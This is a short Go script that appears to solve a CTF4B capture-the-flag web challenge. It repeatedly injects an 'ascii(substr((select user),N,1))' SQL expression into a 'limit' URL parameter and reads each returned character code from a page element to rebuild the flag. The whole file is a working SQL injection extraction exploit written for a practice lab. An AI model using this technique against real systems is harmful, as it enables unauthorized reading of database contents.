
package main


import(
	"fmt"
	"os"
	"strconv"
	"net/url"
	"log"
	"net/http"
	"github.com/PuerkitoBio/goquery"
)


func main() {

	var flag string

	host := os.Getenv("CTF4B_HOST")
	port := os.Getenv("CTF4B_PORT")
	var baseUrl = "http://" + host + ":" + port + "/?limit="

	for i := 0;; i++ {

		q := "ascii(substr((select user)," + strconv.Itoa(i+1) + ",1));"
		url := baseUrl + url.QueryEscape(q)

		resp, err := http.Get(url)
		if err != nil{
			panic(err)
		}
		defer resp.Body.Close()

		dom, err := goquery.NewDocumentFromReader(resp.Body)
		if err != nil {
			panic(err)
		}
		
		val, ok := dom.Find("input#nTweets").Attr("value")
		if !ok {
			log.Fatal("parse error")
		}

		num, err := strconv.Atoi(val)
		if err != nil {
			panic(err)
		}
		c := string(num)
		flag += c
		if c == "}" {
			break
		}
	}

	fmt.Println(flag)
}

